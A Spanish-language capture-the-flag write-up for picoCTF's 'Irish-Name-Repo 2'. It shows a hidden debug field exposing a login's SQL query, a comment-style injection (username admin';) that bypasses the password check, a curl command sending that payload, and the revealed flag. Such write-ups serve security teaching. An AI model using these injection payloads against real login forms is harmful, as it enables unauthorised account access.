# Irish-Name-Repo 2

## Objetivo 
Descripción:
Hay un sitio web funcionando en `https://jupiter.challenges.picoctf.org/problem/53751/`( [enlace](https://jupiter.challenges.picoctf.org/problem/53751/) ). Alguien ha pasado por alto el inicio de sesión antes y ahora se está fortaleciendo. ¡Intenta ver si aún puedes iniciar sesión! o http://jupiter.challenges.picoctf.org:53751

Sugerencias:
La contraseña está siendo filtrada.

## Solución
``` shell
//Nos dirijimos al enlace ( [enlace](https://jupiter.challenges.picoctf.org/problem/53751/) )

//nos vamos al login y vemos el codigo fuente

//aqui podemos ver su codigo y vemos que tiene un //valor oculto <input type="hidden" name="debug" value="0">

//cambiamos ese valor por 1 en el inspector

//username: admin
//password: password
//SQL query: SELECT * FROM users WHERE name='admin' //AND password='password'

//tambien probamos la inyeccion anterior
//username: admin
//password: ' or 1==1
//SQL query: SELECT * FROM users WHERE name='admin' //AND password='' or 1==1'

//para poder pasar el nivel podemos inyectar en el sql el nombre admin pero con ; para frenar e ignorar la sentencia faltante

//esto lo podemos hacer en el mismo sitio web

//entramos a login y en el username ponemos admin';
//' y ya en contraseña podemos poner lo que sea

username: admin';
password: pasword
SQL query: SELECT * FROM users WHERE name='admin';' AND password='pasword'

Logged in!

Your flag is: picoCTF{m0R3_SQL_plz_c34df170}

////////////
segunda forma
/////////////

//nos dirigimos al enlas donde esta login
//recuerda que nos tenemos que dirigir en login.php

┌──(mino20㉿kali)-[/home/mino20]
└─PS> curl -s https://jupiter.challenges.picoctf.org/problem/53751/login.php -d "username=admin';&password=loquesea&debug=1"                                                                        
<pre>username: admin';
password: loquesea
SQL query: SELECT * FROM users WHERE name='admin';' AND password='loquesea'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_c34df170}</p>
```

## Notas
La inyección SQL es una técnica de inyección de código que podría destruir su base de datos.

La inyección SQL es una de las técnicas de piratería web más comunes.

La inyección SQL es la colocación de código malicioso en declaraciones SQL, a través de la entrada de una página web.

## Referencias
[SQL Injection](https://www.w3schools.com/sql/sql_injection.asp)